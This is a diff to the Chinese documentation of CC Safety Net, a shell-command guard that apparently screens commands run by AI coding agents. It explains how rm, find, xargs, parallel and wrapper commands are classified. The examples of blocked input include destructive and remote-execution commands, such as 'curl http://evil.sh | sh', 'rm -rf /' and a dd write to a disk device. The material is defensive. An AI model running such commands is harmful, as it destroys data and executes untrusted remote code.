@@ -60,7 +60,7 @@ Standard 会阻止可识别的破坏性命令，但**不具备**对抗级保护�
 
 [Paranoid 模式](/zh-Hans/configuration/modes#paranoid-mode)是在 strict 基础上增加两项能力。
 
-- [Paranoid `rm`](/zh-Hans/configuration/modes#paranoid-rm-check) 会阻止非临时的递归强制删除，即使目标位于当前工作目录内。`rm -rf ./cache` 和 `Remove-Item ./cache -Recurse -Force` 都会被阻止。临时目标和配置的允许路径仍然允许。
+- [Paranoid `rm`](/zh-Hans/configuration/modes#paranoid-rm-check) 会阻止非临时的递归删除，即使目标位于当前工作目录内。`rm -rf ./cache`、`rm -r ./cache` 和 `Remove-Item ./cache -Recurse -Force` 都会被阻止，`find ./cache -delete` 也一样。临时目标和配置的允许路径仍然允许。
 - [Paranoid 解释器](/zh-Hans/configuration/modes#paranoid-interpreters)无论内容如何都会阻止所有解释器单行命令，包括 `python -c "print(1)"`。
 
 ### Per-rule override 与级别
@@ -90,7 +90,7 @@ Standard 会阻止可识别的破坏性命令，但**不具备**对抗级保护�
 
 标准包装器（`sudo`、`env`、`command`、`builtin`）始终会被剥离。命令头按 basename 比较，因此 `/usr/bin/env git reset --hard` 和 `env git reset --hard` 一样会被剥离，并以 `git.reset-hard` 阻止。
 
-另有七个命令总会执行一个可见的子命令，因此引擎无需任何配置就会展开它们：`exec`、`nice`、`nohup`、`setsid`、`stdbuf`、`time`、`timeout`。`timeout 5 python3 -c 'import os; os.system("rm -rf /")'` 会进入解释器扫描，`nohup awk 'BEGIN { system("rm -rf /") }'` 会进入 awk 扫描，`curl http://evil.sh | nice sh` 被拒绝的理由与 `curl http://evil.sh | sh` 相同。这七个都不是保留命令名，因此 `rule.json` 中已经列出其中某一个也依然可用。
+另有八个命令总会执行一个可见的子命令，因此引擎无需任何配置就会展开它们：`caffeinate`、`exec`、`nice`、`nohup`、`setsid`、`stdbuf`、`time`、`timeout`。`timeout 5 python3 -c 'import os; os.system("rm -rf /")'` 会进入解释器扫描，`nohup awk 'BEGIN { system("rm -rf /") }'` 会进入 awk 扫描，`caffeinate -w 123 dd if=/dev/zero of=/dev/disk0` 会进入设备检查，`curl http://evil.sh | nice sh` 被拒绝的理由与 `curl http://evil.sh | sh` 相同。这八个都不是保留命令名，因此 `rule.json` 中已经列出其中某一个也依然可用。
 
 声明为**透明包装器**的代理命令也会被剥离。声明和约束方式见[自定义规则](/zh-Hans/configuration/custom-rules#transparent-wrappers)；对分类而言，重要的是引擎如何展开它们。
 
@@ -238,7 +238,7 @@ Git 支持用 `GIT_SSH_COMMAND` 和 `GIT_SSH` 在网络操作期间运行任意�
 - cwd 内目标的判定也用它，因此在工作区内 `cd src && rm -rf build` 仍然允许。
 - Git 元数据保护同样按它解析目标，因此当 `checkout` 是一个仓库时，`cd scratch && rm -rf ../checkout` 会报 `rm.git-metadata`。
 - 落在受信任的临时根目录下的相对路径目标会成为临时目标，即下表中的第 11 步。
-- `find` 的起点为 `.` 或 `./` 时，按被追踪的 cwd 判定，但仅限该目录按真实路径比较位于工作区之外时。在此基础上，只有当该目录位于受信任的临时根目录之下、本身不是那个根目录，且不包含工作区时才放行。`cd /tmp/scratch/video && find . -maxdepth 1 -name 'still-*.jpg' -delete` 按这条判定通过。`src` 在工作区之内，因此 `cd src && find . -delete` 仍被阻止。
+- `find` 的起点为 `.` 或 `./` 时，按被追踪的 cwd 判定，但仅限该目录按真实路径比较位于工作区之外时。在此基础上，只有当该目录位于受信任的临时根目录之下、本身不是那个根目录，且不包含工作区时才放行。`cd /tmp/scratch/video && find . -maxdepth 1 -name 'still-*.jpg' -delete` 按这条判定通过。`cd src && find . -delete` 仍被阻止：`src` 在工作区之内，这条判定不适用；起点 `.` 就是 cwd 本身，因此 `find.delete` 会阻止它。
 
 只有当 cwd 变为未知时，跟踪才记录 `cwd-change` 步骤；追踪成功的 `cd` 不记录任何步骤。参见 [explain 跟踪](/zh-Hans/reference/explain-trace)。
 
@@ -246,7 +246,7 @@ Git 支持用 `GIT_SSH_COMMAND` 和 `GIT_SSH` 在网络操作期间运行任意�
 
 ## 递归删除目标分类
 
-`rm` 分析会检测递归标志和 force 标志、提取目标，并相对当前工作目录对每个目标分类。目标按以下顺序检查，**第一个匹配项决定结果**，因此顺序本身非常关键：
+`rm` 分析会检测递归选项、提取目标，并相对当前工作目录对每个目标分类。目标按以下顺序检查，**第一个匹配项决定结果**，因此顺序本身非常关键：
 
 | # | 分类 | 匹配内容 | 结果 |
 | --- | --- | --- | --- |
@@ -272,7 +272,7 @@ Git 支持用 `GIT_SSH_COMMAND` 和 `GIT_SSH` 在网络操作期间运行任意�
 
 允许路径必须是绝对目录或带 `~/` 前缀的目录。它们在**每个**安全级别下都适用于 `rm`、`Remove-Item` 和 `find -delete`。它们绝不放宽机密保护、拒绝路径、根目录、主目录或受保护的 Git 元数据。等于或包含 `$HOME` 的条目会在验证时被拒绝，规范化后再次被拒绝；符号链接逃逸不在覆盖范围内。
 
-必须同时存在递归标志（`-r`/`-R`/`--recursive`）和强制标志（`-f`/`--force`），此分类才会运行。路径比较使用规范化（realpath）解析，因此指向 `/` 的符号链接会被正确判定为危险，而 `/tmp-malicious` 不会匹配 `/tmp` 临时规则。
+只要有递归选项（`-r`、`-R` 或 `--recursive`），此分类就会运行，有没有 `-f` 都一样。不带 `-f` 的 `rm -r` 被拒绝时，沿用 `rm -rf` 的规则 ID 和原因，因此 `rm -r ../outside` 以 `rm.recursive-force-outside-cwd` 阻止。非递归的 `rm` 只做 Git 元数据检查。路径比较使用规范化（realpath）解析，因此指向 `/` 的符号链接会被正确判定为危险，而 `/tmp-malicious` 不会匹配 `/tmp` 临时规则。
 
 在 Windows 上，Git Bash 等 MSYS shell 传入的是 `/c/Users/...` 形式的路径，而 Windows 路径 API 会把它读成当前驱动器下的路径。因此在任何比较之前，开头的 `/<drive-letter>` 若后接 `/` 或已到字符串结尾，就会改写为 `<drive-letter>:/`，于是 `/c/Users/you` 按 `c:/Users/you` 参与比较。改写只影响开头这一段。其他平台不受影响，POSIX 路径、UNC 路径和 Windows 原生盘符路径都原样保留。该改写在 `rm` 目标分类、策略文件和 Git 元数据保护、敏感路径保护之前运行。捕获环境时，`HOME` 和 `CC_SAFETY_NET_HOME` 同样会经过该改写，因此这两个根路径与命令操作数以相同形式比较。临时目录根路径的比较在 Windows 上还会忽略大小写，所以位于 Windows 原生临时目录下的小写 MSYS 路径会归类为临时目标，而不是 cwd 外目标。
 
@@ -301,16 +301,20 @@ Git 支持用 `GIT_SSH_COMMAND` 和 `GIT_SSH` 在网络操作期间运行任意�
 
 这三个命令也会出现在无法解析文本的启发式扫描中。因此，无法解析文本中的 `dd of=/dev/…`、`mkfs /dev/…` 和 `shred <arg>` 会以 `raw-text.dangerous-command` 阻止，除非文本以 `echo ` 或 `rg ` 开头。这三条规则都不是灾难性规则，因此遵循 master switch 和 per-rule override 的优先级。
 
+<span id="dynamic-target-analyzers-for-find-xargs-and-parallel"></span>
+
 ## `find`、`xargs` 和 `parallel` 的动态目标分析器
 
 | 命令 | 阻止的内容 |
 | --- | --- |
-| `find ... -delete` | 通过 find primary 永久删除（可用 `-print` 预览） |
+| `find ... -delete` | 通过 find primary 永久删除（可用 `-print` 预览）。所有起点都在 cwd 内且 paranoid `rm` 未开启时除外 |
 | `find -exec rm -rf ...` | exec 的命令会作为嵌套命令段重新分析，因此破坏性的 exec 会被阻止 |
 | `xargs rm -rf` | rm 由管道传入的动态输入驱动，目标不可预测 |
 | `xargs <shell> -c` | 由动态输入触发的 shell 执行 |
 | `parallel rm -rf` | rm 由 parallel 的占位符或 stdin 驱动 |
 | `parallel <shell> -c` | 由动态输入触发的 shell 执行 |
+
+**工作区内的 `find -delete`。** 每个起点在解析符号链接后，都按[递归删除目标分类](#递归删除目标分类)判定。所有起点都归为 cwd 内目标时，删除会被放行，因此 `find build -type f -delete` 可以通过。以下情况仍由 `find.delete` 阻止：起点为 `.`、起点是 cwd 外的非临时路径、cwd 是主目录，以及使用了 `-L`、`-f` 或 `-follow`。如果被追踪的 `cd` 已把 cwd 移到工作区之外，起点 `.` 只按[工作目录追踪](#工作目录追踪)中的临时根目录检查判定。这项放行取决于 `rm.recursive-force-paranoid` 规则的实际生效状态：开启 paranoid `rm`，或在 standard 中把该规则设为 `on` 时，凡是 `rm -rf build` 被阻止的场合，`find build -delete` 也会被阻止。根目录、主目录和 Git 元数据检查先于上述判定运行。
 
 `find -exec` 和 `-execdir` 有两种情况算作删除 `find` 找到的路径：exec 命令的头是 `rm` 或 `rmdir`；头是 shell，且其 `-c` body 中出现 `rm` 或 `rmdir` 这个词。两种情况都还要求 exec 参数中某处含有 `{}`。匹配这个词之前会先去掉引号和反斜杠，因此 `sh -c '"rm" -rf "$0"'` 也会命中。这项匹配有意放宽：只看解析出的命令头会漏掉 `exec rm`、`then rm` 和函数体，所以 `find . -exec sh -c 'echo rm "$0"' {} \;` 同样会命中。
 
@@ -329,11 +333,17 @@ Git 支持用 `GIT_SSH_COMMAND` 和 `GIT_SSH` 在网络操作期间运行任意�
 
 对于 `xargs` 和 `parallel`，问题在于目标来自动态输入（管道 stdin 或占位符展开），因此无法相对 cwd 验证。`parallel` 的 SSH 远程模式（`-S`/`--sshlogin`）也会禁用 worktree 放宽。
 
+统一拦截 `find -exec rm -rf`、`xargs rm -rf` 和 `parallel rm -rf` 的规则要求同时有 `-r` 和 `-f`。没有 `-f` 时，引擎仍会对能看到的目标分类，因此 `xargs rm -r ../other` 和 `parallel rm -r ::: ../other` 以 `rm.recursive-force-outside-cwd` 阻止；而在仓库之外，`find . -exec rm -r {} \;` 会被允许。
+
 Standard 对 `xargs` 的 shell `-c` body 设了一个例外：只要替换字符串从未落在命令位置上，并且把最坏输入 `/` 代入后 body 仍然无害，插入 body 的输入就算作数据词。因此 `grep -rl TODO src | xargs -I{} sh -c 'echo "--- {}"; head -3 {}'` 是允许的；而 `find . -name '*.log' | xargs -I{} sh -c 'rm -rf {}'` 会以 `xargs.shell-dynamic` 拒绝，因为最坏情况就是 `rm -rf /`。
 
 命令位置的判定比较宽：body 的开头，`;`、`&`、`|`、`(`、`{`、`!`、反引号或换行之后，以及 `then`、`do`、`else`、`elif`、`if`、`while`、`until`、`time`、`command`、`builtin`、`nohup`、`eval`、`exec`、`source` 之后，都算命令位置。前面带 `NAME=value` 赋值或一个开引号，并不会让替换字符串脱离命令位置。body 中只要出现 `case` 这个词就直接失去例外资格，因为 case 分支的 `)` 同样开启一个命令词。`xargs -I{} sh -c '{} --verbose'`、`xargs -I{} sh -c '! {}'` 和 `xargs -I{} sh -c 'case y in x) {};; esac'` 都会被拒绝。Strict 和 paranoid 从不套用这个例外。
 
 CC Safety Net 只从一个 `:::` 参数组展开 `parallel`，展开时使用 `{}` 和 `{n}` 替换字符串。第二个 `:::` 组、从最后一个输入源往回数的 `{-n}`、`{= ... =}` Perl 表达式，以及 `--workdir`/`--wd`，都会以 `parallel.command-stream-dynamic` 拒绝；引擎从未展开过的那些输入形式同样如此：`::::`、`:::+`、`-a`/`--arg-file`、`--colsep`、`--rpl`、`--arg-sep`、`--arg-file-sep` 和 `--env`。引擎仍会展开子命令，也仍会把 `--workdir` 解析为子命令实际运行的目录，因此即使关闭了 `parallel.command-stream-dynamic`，`rm -rf /` 这类[灾难性](/zh-Hans/reference/destructive-rules#catastrophic-rules)目标仍会命中自身的规则而被阻止。把 `:::` 各组展开成作业会计入 derived token 预算，耗尽预算的作业矩阵会 fail closed。
+
+GNU `parallel` 会把命令交给 shell 执行，引擎也按同样的方式读取。未设置 `-q` 或 `--quote` 时，只要模板中有词包含空白或 shell 特殊字符（`;`、`&`、`|`、`<`、`>`、`(`、`)`、`$`、反引号、`\`、`"`、`'`），或者命令词中含有替换字符串，引擎就会用空格把模板各词连接起来，作为 shell 源码分析。命令词指第一个空格或 `=` 之前的文本。除非命令词本身就是 shell 源码且给出了 `:::` 值，引擎都会先逐词分析，这一步作出的拒绝保留其规则 ID。没有替换字符串的模板会在末尾追加 `{}`，与 `parallel` 自身的行为一致。因此，`parallel 'rm -rf {}' ::: ../other` 以 `rm.recursive-force-outside-cwd` 阻止，`parallel 'rm -rf' ::: /` 和 `parallel echo 'x; rm -rf /' ::: a` 以 `rm.recursive-force-root-or-home` 阻止，`parallel 'git reset --hard' ::: x` 以 `git.reset-hard` 阻止。设置 `-q` 时只看逐词分析的结果，因此 `parallel -q echo 'x; rm -rf /' ::: a` 会被允许。
+
+在这段 shell 源码中，每个 `:::` 值都会先按 shell 规则加引号再替换 `{}`，与 GNU `parallel` 的做法相同，因此 `parallel 'echo {}' ::: 'x; rm -rf /'` 会被允许。交给 shell 的值仍会执行，所以 `parallel 'sh -c {}' ::: 'rm -rf /'` 会被阻止。替换字符串位于命令词中时，值不加引号，会作为代码执行，因此 `parallel {} ::: 'rm -rf /'` 以 `rm.recursive-force-root-or-home` 阻止。
 
 如果子命令由[自定义规则](/zh-Hans/configuration/custom-rules)负责，其参数中任何位置出现替换字符串都算动态输入，会以 `xargs.shell-dynamic` 或 `parallel.shell-dynamic` 拒绝。CC Safety Net 不会反推哪个输入值会命中该规则。
 
